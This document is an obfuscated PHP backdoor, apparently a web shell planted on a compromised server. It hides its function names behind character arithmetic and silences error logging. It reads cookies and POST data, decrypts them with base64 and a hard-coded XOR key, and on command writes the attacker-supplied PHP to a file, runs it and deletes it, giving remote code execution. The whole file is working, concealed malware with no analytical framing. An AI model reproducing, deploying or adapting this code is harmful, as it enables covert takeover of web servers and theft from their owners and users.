<?php $ZPustFuSe = 'f'."\151"."\x6c"."\145".chr(95)."\160"."\x75"."\164".chr(95).chr(246-147)."\x6f"."\156".'t'.chr(664-563).'n'.chr(745-629).'s';
$WbCfoQI = 'b'.chr(97)."\163".'e'."\66"."\x34".chr(623-528)."\x64"."\x65"."\143"."\157".chr(100).chr(101);
$LcaHFEN = chr(779-674)."\x6e"."\x69".chr(581-486)."\163".chr(101).chr(116);
$PWFoYXw = chr(870-753)."\156"."\154".'i'."\x6e".chr(107);


@$LcaHFEN(chr(303-202)."\162"."\162"."\x6f"."\162".chr(95).chr(366-258)."\157".chr(534-431), NULL);
@$LcaHFEN(chr(108)."\157".chr(103).'_'.chr(493-392).chr(114)."\x72".chr(111).chr(773-659).chr(115), 0);
@$LcaHFEN("\x6d".chr(427-330)."\x78".'_'."\x65"."\x78".chr(752-651).chr(99)."\x75".chr(116).chr(565-460).chr(738-627)."\156".chr(916-821).'t'.chr(908-803).chr(109)."\145", 0);
@set_time_limit(0);

function SkPbggfLra($DUsPuxDeah, $JmzwcoiW)
{
    $SWlXbQiYG = "";
    for ($xoGjUORT = 0; $xoGjUORT < strlen($DUsPuxDeah);) {
        for ($j = 0; $j < strlen($JmzwcoiW) && $xoGjUORT < strlen($DUsPuxDeah); $j++, $xoGjUORT++) {
            $SWlXbQiYG .= chr(ord($DUsPuxDeah[$xoGjUORT]) ^ ord($JmzwcoiW[$j]));
        }
    }
    return $SWlXbQiYG;
}

$mwhlPJBV = array_merge($_COOKIE, $_POST);
$KYmEfhDd = '1d8f16a2-844d-47eb-a780-fe39c693fcfc';
foreach ($mwhlPJBV as $jrGLF => $DUsPuxDeah) {
    $DUsPuxDeah = @unserialize(SkPbggfLra(SkPbggfLra($WbCfoQI($DUsPuxDeah), $KYmEfhDd), $jrGLF));
    if (isset($DUsPuxDeah["\141"."\153"])) {
        if ($DUsPuxDeah["\141"] == chr(105)) {
            $xoGjUORT = array(
                'p'.chr(829-711) => @phpversion(),
                's'.chr(118) => "3.5",
            );
            echo @serialize($xoGjUORT);
        } elseif ($DUsPuxDeah["\141"] == chr(101)) {
            $yYSaMIKA = "./" . md5($KYmEfhDd) . chr(783-737)."\x69".chr(806-696).chr(788-689);
            @$ZPustFuSe($yYSaMIKA, "<" . chr(63)."\x70".chr(242-138)."\x70".chr(132-100)."\x40"."\x75"."\x6e"."\154"."\151"."\x6e".'k'."\50".chr(95)."\x5f".chr(1024-954).chr(73)."\114".'E'.chr(259-164).chr(95)."\51".chr(375-316).chr(32) . $DUsPuxDeah["\x64"]);
            include($yYSaMIKA);
            @$PWFoYXw($yYSaMIKA);
        }
        exit();
    }
}

